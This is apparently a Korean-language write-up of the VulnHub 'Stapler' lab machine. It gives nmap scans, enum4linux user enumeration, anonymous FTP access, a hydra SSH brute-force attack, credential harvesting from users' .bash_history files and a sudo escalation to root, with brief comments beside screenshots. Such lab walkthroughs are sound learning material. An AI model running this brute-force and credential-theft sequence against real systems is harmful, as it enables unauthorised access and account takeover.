[Stapler](https://www.vulnhub.com/entry/stapler-1,150/)

# targetdiscovery
***
### nmap -sn 192.168.25.8-255 --open
![1](https://user-images.githubusercontent.com/69203345/111029768-c81cbf80-8441-11eb-862d-c7319adb57bf.PNG)

# enumerate + exploitation
***
## target: 192.168.25.9
### nmap -O -sV -sS -p- 192.168.25.9
![2](https://user-images.githubusercontent.com/69203345/111029811-0dd98800-8442-11eb-94f2-32d274cf8e5a.PNG)     
Samba 열려있음     
### enum4linux 192.168.25.9
![3](https://user-images.githubusercontent.com/69203345/111029940-e7681c80-8442-11eb-8c26-75b3ca31d11c.PNG)      
유저리스트 인듯..?        
#### cat users.txt | cut -d ' \ ' -f2 | cut -d ' ' -f1 > users.txt  
cat users.txt      
![4](https://user-images.githubusercontent.com/69203345/111030029-5fcedd80-8443-11eb-8ce0-487b5119788f.PNG)      
### ftp 192.168.25.9
anonymous 로그인 후 get note 하고 확인      
![5](https://user-images.githubusercontent.com/69203345/111030078-c3f1a180-8443-11eb-981c-94a11669e65e.PNG)     
### hydra -L users.txt -P users.txt 192.168.25.9 ssh 
![6](https://user-images.githubusercontent.com/69203345/111030245-745fa580-8444-11eb-8cbf-dc6be5d5fa60.PNG)       
뭔가 얻음   
### ssh SHayslett@192.168.25.9
![7](https://user-images.githubusercontent.com/69203345/111030296-b2f56000-8444-11eb-86f5-85a86cf3a2ba.PNG)     
로그인 성공함      

# privilege escalation 
***   
#### cd /home에서 find -name '.bash_history' -exec cat {} \;
![8](https://user-images.githubusercontent.com/69203345/111030701-154f6000-8447-11eb-8ad7-5f80202d7687.PNG)     
로그인 흔적이 보인다    
### su peter
![9](https://user-images.githubusercontent.com/69203345/111030750-56e00b00-8447-11eb-9b15-1fc5d0375950.PNG)      
### sudo -l     sudo /bin/bash
![10](https://user-images.githubusercontent.com/69203345/111030825-b4745780-8447-11eb-9721-4ac5e1c7d4d3.PNG)

ㄲ-ㅌ

root획득   
꼭 이방법만 있는것은 아니다.
으악.
***
